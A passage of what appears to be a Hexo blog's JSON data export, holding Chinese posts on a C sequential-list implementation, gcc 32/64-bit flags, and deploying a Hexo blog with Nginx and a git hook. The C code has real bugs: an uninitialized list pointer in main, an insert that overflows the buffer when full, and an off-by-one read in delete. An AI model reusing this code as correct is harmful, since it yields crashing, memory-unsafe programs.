for(int count=0;count<INIT_SIZE;count++)\n    {\n        ListInsert(Mylist,0,count);\n    }\n\n    PrintList(Mylist);\n\n    DeleteList(Mylist,3);\n\n    PrintList(Mylist);\n    printf(\"Find 2 in %d.\\n\",FindElem(Mylist,2));\n    return 0;\n}\n\n```\n\n实现了顺序表的初始化、创建、增加（n）、删除(n)、查找(n)；","source":"_posts/C语言-顺序表.md","raw":"---\ntitle: 关于C语言的一些奇奇怪怪\ndate: 2021-08-08 20:56:45\ncategories: \n    - 编程\ntags: \n    - C语言\nmp3: \ncover: img/2.jpg\n---\n\n```csharp\n#include <stdio.h>\n#include <stdlib.h>\n\n#define INIT_SIZE 5\n#define INCREMENT 2\n\ntypedef int ElemType;\ntypedef struct{\n    ElemType *data;\n    int length;\n    int list_length;\n}SqList;\n\nint InitList_Sq(SqList *L)\n{\n    L->data=(ElemType *)malloc(INIT_SIZE*sizeof(ElemType));\n    if(!L->data){\n        return -1;\n    }\n    L->length=0;\n    L->list_length=INIT_SIZE;\n    return 1;\n}\n\nint ListInsert(SqList *L,int index,ElemType temp_data)\n{\n    int j;\n    ElemType *newBase;\n    if(index<0 || index>L->length)\n    {\n        //realloc重新分配\n        newBase=(ElemType *)realloc(L->data,(L->list_length+INCREMENT)*sizeof(ElemType));\n        if(!newBase)\n        {\n            return -1;\n        }\n        L->data=newBase;\n        L->list_length+=INCREMENT;\n    }\n    for(j=L->length-1;j>=index;j--)\n    {\n        L->data[j+1]=L->data[j];\n    }\n    L->data[index]=temp_data;\n    L->length++;\n    return 1;\n}\n\nint DeleteList(SqList *L,int pos)\n{\n    if(pos<0||pos>L->length)\n    {\n        printf(\"Wrong position.\\n\");\n        return 0;\n    }\n    for(int index=pos;index<L->length;index++)\n    {\n        L->data[index]=L->data[index+1];\n    }\n    L->length--;\n    return 1;\n}\n\nint FindElem(SqList *L,ElemType target)\n{\n    if(!L->data)\n    {\n        printf(\"Empty table.\\n\");\n        return -1;\n    }\n    for(int index=0;index<L->length;index++)\n    {\n        if(target==L->data[index])\n        {\n            printf(\"Find at %d.\\n\",index);\n            return index;\n        }\n    }\n    printf(\"No such a data.\\n\");\n    return -1;\n}\n\nvoid PrintList(SqList *L)\n{\n    for(int index=0;index<L->length;index++)\n    {\n        printf(\"%d \",L->data[index]);\n    }\n    printf(\"\\n\");\n}\n\n\nint main()\n{\n    SqList *Mylist;\n    InitList_Sq(Mylist);\n\n    for(int count=0;count<INIT_SIZE;count++)\n    {\n        ListInsert(Mylist,0,count);\n    }\n\n    PrintList(Mylist);\n\n    DeleteList(Mylist,3);\n\n    PrintList(Mylist);\n    printf(\"Find 2 in %d.\\n\",FindElem(Mylist,2));\n    return 0;\n}\n\n```\n\n实现了顺序表的初始化、创建、增加（n）、删除(n)、查找(n)；","slug":"C语言-顺序表","published":1,"updated":"2021-08-14T16:11:00.000Z","_id":"clg29vyfv000hao9c35of1z0v","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs csharp\"><span class=\"hljs-meta\">#include &lt;stdio.h&gt;</span><br><span class=\"hljs-meta\">#include &lt;stdlib.h&gt;</span><br><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> INIT_SIZE 5</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> INCREMENT 2</span><br><br>typedef <span class=\"hljs-built_in\">int</span> ElemType;<br>typedef <span class=\"hljs-keyword\">struct</span>&#123;<br>    ElemType *data;<br>    <span class=\"hljs-built_in\">int</span> length;<br>    <span class=\"hljs-built_in\">int</span> list_length;<br>&#125;SqList;<br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">InitList_Sq</span>(<span class=\"hljs-params\">SqList *L</span>)</span><br>&#123;<br>    L-&gt;data=(ElemType *)malloc(INIT_SIZE*<span class=\"hljs-keyword\">sizeof</span>(ElemType));<br>    <span class=\"hljs-keyword\">if</span>(!L-&gt;data)&#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>    &#125;<br>    L-&gt;length=<span class=\"hljs-number\">0</span>;<br>    L-&gt;list_length=INIT_SIZE;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">ListInsert</span>(<span class=\"hljs-params\">SqList *L,<span class=\"hljs-built_in\">int</span> index,ElemType temp_data</span>)</span><br>&#123;<br>    <span class=\"hljs-built_in\">int</span> j;<br>    ElemType *newBase;<br>    <span class=\"hljs-keyword\">if</span>(index&lt;<span class=\"hljs-number\">0</span> || index&gt;L-&gt;length)<br>    &#123;<br>        <span class=\"hljs-comment\">//realloc重新分配</span><br>        newBase=(ElemType *)realloc(L-&gt;data,(L-&gt;list_length+INCREMENT)*<span class=\"hljs-keyword\">sizeof</span>(ElemType));<br>        <span class=\"hljs-keyword\">if</span>(!newBase)<br>        &#123;<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>        &#125;<br>        L-&gt;data=newBase;<br>        L-&gt;list_length+=INCREMENT;<br>    &#125;<br>    <span class=\"hljs-keyword\">for</span>(j=L-&gt;length<span class=\"hljs-number\">-1</span>;j&gt;=index;j--)<br>    &#123;<br>        L-&gt;data[j+<span class=\"hljs-number\">1</span>]=L-&gt;data[j];<br>    &#125;<br>    L-&gt;data[index]=temp_data;<br>    L-&gt;length++;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">DeleteList</span>(<span class=\"hljs-params\">SqList *L,<span class=\"hljs-built_in\">int</span> pos</span>)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(pos&lt;<span class=\"hljs-number\">0</span>||pos&gt;L-&gt;length)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;Wrong position.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index=pos;index&lt;L-&gt;length;index++)<br>    &#123;<br>        L-&gt;data[index]=L-&gt;data[index+<span class=\"hljs-number\">1</span>];<br>    &#125;<br>    L-&gt;length--;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">FindElem</span>(<span class=\"hljs-params\">SqList *L,ElemType target</span>)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(!L-&gt;data)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;Empty table.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index=<span class=\"hljs-number\">0</span>;index&lt;L-&gt;length;index++)<br>    &#123;<br>        <span class=\"hljs-keyword\">if</span>(target==L-&gt;data[index])<br>        &#123;<br>            printf(<span class=\"hljs-string\">&quot;Find at %d.\\n&quot;</span>,index);<br>            <span class=\"hljs-keyword\">return</span> index;<br>        &#125;<br>    &#125;<br>    printf(<span class=\"hljs-string\">&quot;No such a data.\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">PrintList</span>(<span class=\"hljs-params\">SqList *L</span>)</span><br>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index=<span class=\"hljs-number\">0</span>;index&lt;L-&gt;length;index++)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;%d &quot;</span>,L-&gt;data[index]);<br>    &#125;<br>    printf(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>&#125;<br><br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">main</span>()</span><br>&#123;<br>    SqList *Mylist;<br>    InitList_Sq(Mylist);<br><br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> count=<span class=\"hljs-number\">0</span>;count&lt;INIT_SIZE;count++)<br>    &#123;<br>        ListInsert(Mylist,<span class=\"hljs-number\">0</span>,count);<br>    &#125;<br><br>    PrintList(Mylist);<br><br>    DeleteList(Mylist,<span class=\"hljs-number\">3</span>);<br><br>    PrintList(Mylist);<br>    printf(<span class=\"hljs-string\">&quot;Find 2 in %d.\\n&quot;</span>,FindElem(Mylist,<span class=\"hljs-number\">2</span>));<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n<p>实现了顺序表的初始化、创建、增加（n）、删除(n)、查找(n)；</p>\n","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs csharp\"><span class=\"hljs-meta\">#include &lt;stdio.h&gt;</span><br><span class=\"hljs-meta\">#include &lt;stdlib.h&gt;</span><br><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> INIT_SIZE 5</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">define</span> INCREMENT 2</span><br><br>typedef <span class=\"hljs-built_in\">int</span> ElemType;<br>typedef <span class=\"hljs-keyword\">struct</span>&#123;<br>    ElemType *data;<br>    <span class=\"hljs-built_in\">int</span> length;<br>    <span class=\"hljs-built_in\">int</span> list_length;<br>&#125;SqList;<br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">InitList_Sq</span>(<span class=\"hljs-params\">SqList *L</span>)</span><br>&#123;<br>    L-&gt;data=(ElemType *)malloc(INIT_SIZE*<span class=\"hljs-keyword\">sizeof</span>(ElemType));<br>    <span class=\"hljs-keyword\">if</span>(!L-&gt;data)&#123;<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>    &#125;<br>    L-&gt;length=<span class=\"hljs-number\">0</span>;<br>    L-&gt;list_length=INIT_SIZE;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">ListInsert</span>(<span class=\"hljs-params\">SqList *L,<span class=\"hljs-built_in\">int</span> index,ElemType temp_data</span>)</span><br>&#123;<br>    <span class=\"hljs-built_in\">int</span> j;<br>    ElemType *newBase;<br>    <span class=\"hljs-keyword\">if</span>(index&lt;<span class=\"hljs-number\">0</span> || index&gt;L-&gt;length)<br>    &#123;<br>        <span class=\"hljs-comment\">//realloc重新分配</span><br>        newBase=(ElemType *)realloc(L-&gt;data,(L-&gt;list_length+INCREMENT)*<span class=\"hljs-keyword\">sizeof</span>(ElemType));<br>        <span class=\"hljs-keyword\">if</span>(!newBase)<br>        &#123;<br>            <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>        &#125;<br>        L-&gt;data=newBase;<br>        L-&gt;list_length+=INCREMENT;<br>    &#125;<br>    <span class=\"hljs-keyword\">for</span>(j=L-&gt;length<span class=\"hljs-number\">-1</span>;j&gt;=index;j--)<br>    &#123;<br>        L-&gt;data[j+<span class=\"hljs-number\">1</span>]=L-&gt;data[j];<br>    &#125;<br>    L-&gt;data[index]=temp_data;<br>    L-&gt;length++;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">DeleteList</span>(<span class=\"hljs-params\">SqList *L,<span class=\"hljs-built_in\">int</span> pos</span>)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(pos&lt;<span class=\"hljs-number\">0</span>||pos&gt;L-&gt;length)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;Wrong position.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index=pos;index&lt;L-&gt;length;index++)<br>    &#123;<br>        L-&gt;data[index]=L-&gt;data[index+<span class=\"hljs-number\">1</span>];<br>    &#125;<br>    L-&gt;length--;<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">1</span>;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">FindElem</span>(<span class=\"hljs-params\">SqList *L,ElemType target</span>)</span><br>&#123;<br>    <span class=\"hljs-keyword\">if</span>(!L-&gt;data)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;Empty table.\\n&quot;</span>);<br>        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>    &#125;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index=<span class=\"hljs-number\">0</span>;index&lt;L-&gt;length;index++)<br>    &#123;<br>        <span class=\"hljs-keyword\">if</span>(target==L-&gt;data[index])<br>        &#123;<br>            printf(<span class=\"hljs-string\">&quot;Find at %d.\\n&quot;</span>,index);<br>            <span class=\"hljs-keyword\">return</span> index;<br>        &#125;<br>    &#125;<br>    printf(<span class=\"hljs-string\">&quot;No such a data.\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">-1</span>;<br>&#125;<br><br><span class=\"hljs-function\"><span class=\"hljs-keyword\">void</span> <span class=\"hljs-title\">PrintList</span>(<span class=\"hljs-params\">SqList *L</span>)</span><br>&#123;<br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> index=<span class=\"hljs-number\">0</span>;index&lt;L-&gt;length;index++)<br>    &#123;<br>        printf(<span class=\"hljs-string\">&quot;%d &quot;</span>,L-&gt;data[index]);<br>    &#125;<br>    printf(<span class=\"hljs-string\">&quot;\\n&quot;</span>);<br>&#125;<br><br><br><span class=\"hljs-function\"><span class=\"hljs-built_in\">int</span> <span class=\"hljs-title\">main</span>()</span><br>&#123;<br>    SqList *Mylist;<br>    InitList_Sq(Mylist);<br><br>    <span class=\"hljs-keyword\">for</span>(<span class=\"hljs-built_in\">int</span> count=<span class=\"hljs-number\">0</span>;count&lt;INIT_SIZE;count++)<br>    &#123;<br>        ListInsert(Mylist,<span class=\"hljs-number\">0</span>,count);<br>    &#125;<br><br>    PrintList(Mylist);<br><br>    DeleteList(Mylist,<span class=\"hljs-number\">3</span>);<br><br>    PrintList(Mylist);<br>    printf(<span class=\"hljs-string\">&quot;Find 2 in %d.\\n&quot;</span>,FindElem(Mylist,<span class=\"hljs-number\">2</span>));<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>\n\n<p>实现了顺序表的初始化、创建、增加（n）、删除(n)、查找(n)；</p>\n"},{"title":"关于C语言的一些奇奇怪怪","date":"2021-03-05T12:56:45.000Z","mp3":null,"cover":"img/bg19.jpg","_content":"\n\n\n# 关于C语言的一些奇奇怪怪\n\n1.编译后产生的exe文件在win10运行不了，报错：exe 与你运行的 Windows 版本不兼容。请查看计算机的系统信息，然后联系软件发布者。\n\n解决方案：待解决，展示没有弄清楚。以前编译的exe文件照样可以使用！！！离谱😀\n\n​\t欢天喜地，解决啦！！！ 指令代码：gcc -m64 test.cpp -o test.exe\n\n​\t注解： -m64 //输出64位exe\t\t-m32 //输出32位exe 🤤\n\n2.将一个int数据切割？？？","source":"_posts/C语言相关问题.md","raw":"---\ntitle: 关于C语言的一些奇奇怪怪\ndate: 2021-03-5 20:56:45\ncategories: \n    - 编程\ntags: \n    - C语言\nmp3: \ncover: img/bg19.jpg\n---\n\n\n\n# 关于C语言的一些奇奇怪怪\n\n1.编译后产生的exe文件在win10运行不了，报错：exe 与你运行的 Windows 版本不兼容。请查看计算机的系统信息，然后联系软件发布者。\n\n解决方案：待解决，展示没有弄清楚。以前编译的exe文件照样可以使用！！！离谱😀\n\n​\t欢天喜地，解决啦！！！ 指令代码：gcc -m64 test.cpp -o test.exe\n\n​\t注解： -m64 //输出64位exe\t\t-m32 //输出32位exe 🤤\n\n2.将一个int数据切割？？？","slug":"C语言相关问题","published":1,"updated":"2021-08-07T16:16:46.000Z","_id":"clg29vyfx000kao9cegt5fo5s","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"关于C语言的一些奇奇怪怪\"><a href=\"#关于C语言的一些奇奇怪怪\" class=\"headerlink\" title=\"关于C语言的一些奇奇怪怪\"></a>关于C语言的一些奇奇怪怪</h1><p>1.编译后产生的exe文件在win10运行不了，报错：exe 与你运行的 Windows 版本不兼容。请查看计算机的系统信息，然后联系软件发布者。</p>\n<p>解决方案：待解决，展示没有弄清楚。以前编译的exe文件照样可以使用！！！离谱😀</p>\n<p>​    欢天喜地，解决啦！！！ 指令代码：gcc -m64 test.cpp -o test.exe</p>\n<p>​    注解： -m64 //输出64位exe        -m32 //输出32位exe 🤤</p>\n<p>2.将一个int数据切割？？？</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"关于C语言的一些奇奇怪怪\"><a href=\"#关于C语言的一些奇奇怪怪\" class=\"headerlink\" title=\"关于C语言的一些奇奇怪怪\"></a>关于C语言的一些奇奇怪怪</h1><p>1.编译后产生的exe文件在win10运行不了，报错：exe 与你运行的 Windows 版本不兼容。请查看计算机的系统信息，然后联系软件发布者。</p>\n<p>解决方案：待解决，展示没有弄清楚。以前编译的exe文件照样可以使用！！！离谱😀</p>\n<p>​    欢天喜地，解决啦！！！ 指令代码：gcc -m64 test.cpp -o test.exe</p>\n<p>​    注解： -m64 //输出64位exe        -m32 //输出32位exe 🤤</p>\n<p>2.将一个int数据切割？？？</p>\n"},{"title":"Hexo搭建博客","date":"2020-11-02T01:23:46.000Z","mp3":null,"cover":"img/hexo.jpeg","_content":"\n\n## Hexo相关\n\n 1. npm hexo node安装\n 2. hexo init blog(此处建议更换国内源,提高初始化速度,github乌龟速度)\n 3. hexo g 生成静态页面,hexo s启动本地服务器, hexo d部署到github或者服务器\n\n\n## 服务器相关\n 1. nginx,git安装\n 如果无法建立连接，可以在本地生成ssh-keygen,将公钥保存到服务器再进行部署\n 2. nginx配置\na.nginx.conf\n```bash\nserver {\n  # 侦听80端口\n  listen 80;\n  # 域名\n  server_name www.catnipball.xyz;\n  #默认请求\n  location / {\n    # 网站根目录，此处为你的Hexo部署位置\n    root /home/hexo;\n    index index.html index.htm;\n  }\n}\n```\nb.hooks:post-receive\n\n```bash\n#!/bin/sh\ngit --work-tree=/home/hexo --git-dir=/home/git/blog.git checkout -f\n```\nc.local hexo项目\n\n```bash\n# Deployment\n# Docs: https://hexo.io/docs/deployment.html\ndeploy:\n  type: git                                       \n  repo: git@你的服务器ip:/home/git/blog.git\t\t\n  branch: master  \n```\n## 问题\n\n - Nginx 403报错:将conf直接写在nginx.conf文件中;开放80端口\n - 图片无法加载(网页图片链接在github):取消本地hexo配置中github相关\n - 'git' 不是内部或外部命令，也不是可运行的程序\n   或批处理文件。  Sol：添加git到环境变量>set PATH=%PATH%;C:\\Program Files\\Git\\bin\n\n## 主题相关\n\n- 代码高亮显示：highlight:true;  然后在markdown文件里表明代码类型如C语言：csharp；","source":"_posts/Hexo+Nginx+阿里云服务器搭建Blog相关.md","raw":"---\ntitle: Hexo搭建博客\ndate: 2020-11-2 9:23:46\ncategories: \n    - 网站\ntags: \n    - Web\n    - Hexo\n    - 阿里云\nmp3: \ncover: img/hexo.jpeg\n---\n\n\n## Hexo相关\n\n 1. npm hexo node安装\n 2. hexo init blog(此处建议更换国内源,提高初始化速度,github乌龟速度)\n 3. hexo g 生成静态页面,hexo s启动本地服务器, hexo d部署到github或者服务器\n\n\n## 服务器相关\n 1. nginx,git安装\n 如果无法建立连接，可以在本地生成ssh-keygen,将公钥保存到服务器再进行部署\n 2. nginx配置\na.nginx.conf\n```bash\nserver {\n  # 侦听80端口\n  listen 80;\n  # 域名\n  server_name www.catnipball.xyz;\n  #默认请求\n  location / {\n    # 网站根目录，此处为你的Hexo部署位置\n    root /home/hexo;\n    index index.html index.htm;\n  }\n}\n```\nb.hooks:post-receive\n\n```bash\n#!/bin/sh\ngit --work-tree=/home/hexo --git-dir=/home/git/blog.git checkout -f\n```\nc.local hexo项目\n\n```bash\n# Deployment\n# Docs: https://hexo.io/docs/deployment.html\ndeploy:\n  type: git                                       \n  repo: git@你的服务器ip:/home/git/blog.git\t\t\n  branch: master  \n```\n## 问题\n\n - Nginx 403报错:将conf直接写在nginx.conf文件中;开放80端口\n - 图片无法加载(网页图片链接在github):取消本地hexo配置中github相关\n - 'git' 不是内部或外部命令，也不是可运行的程序\n   或批处理文件。  Sol：添加git到环境变量>set PATH=%PATH%;C:\\Program Files\\Git\\bin\n\n## 主题相关\n\n- 代码高亮显示：highlight:true;  然后在markdown文件里表明代码类型如C语言：csharp；","slug":"Hexo+Nginx+阿里云服务器搭建Blog相关","published":1,"updated":"2021-08-14T16:13:44.000Z","_id":"clg29vyfz000nao9cdregd85k","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"Hexo相关\"><a href=\"#Hexo相关\" class=\"headerlink\" title=\"Hexo相关\"></a>Hexo相关</h2><ol>\n<li>npm hexo node安装</li>\n<li>hexo init blog(此处建议更换国内源,提高初始化速度,github乌龟速度)</li>\n<li>hexo g 生成静态页面,hexo s启动本地服务器, hexo d部署到github或者服务器</li>\n</ol>\n<h2 id=\"服务器相关\"><a href=\"#服务器相关\" class=\"headerlink\" title=\"服务器相关\"></a>服务器相关</h2><ol>\n<li>nginx,git安装<br>如果无法建立连接，可以在本地生成ssh-keygen,将公钥保存到服务器再进行部署</li>\n<li>nginx配置<br>a.nginx.conf<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">server &#123;<br>  <span class=\"hljs-comment\"># 侦听80端口</span><br>  listen 80;<br>  <span class=\"hljs-comment\"># 域名</span><br>  server_name www.catnipball.xyz;<br>  <span class=\"hljs-comment\">#默认请求</span><br>  location / &#123;<br>    <span class=\"hljs-comment\"># 网站根目录，此处为你的Hexo部署位置</span><br>    root /home/hexo;<br>    index index.html index.htm;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>\nb.hooks:post-receive</li>\n</ol>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/bin/sh</span><br>git --work-tree=/home/hexo --git-dir=/home/git/blog.git checkout -f<br></code></pre></td></tr></table></figure>\n<p>c.local hexo项目</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 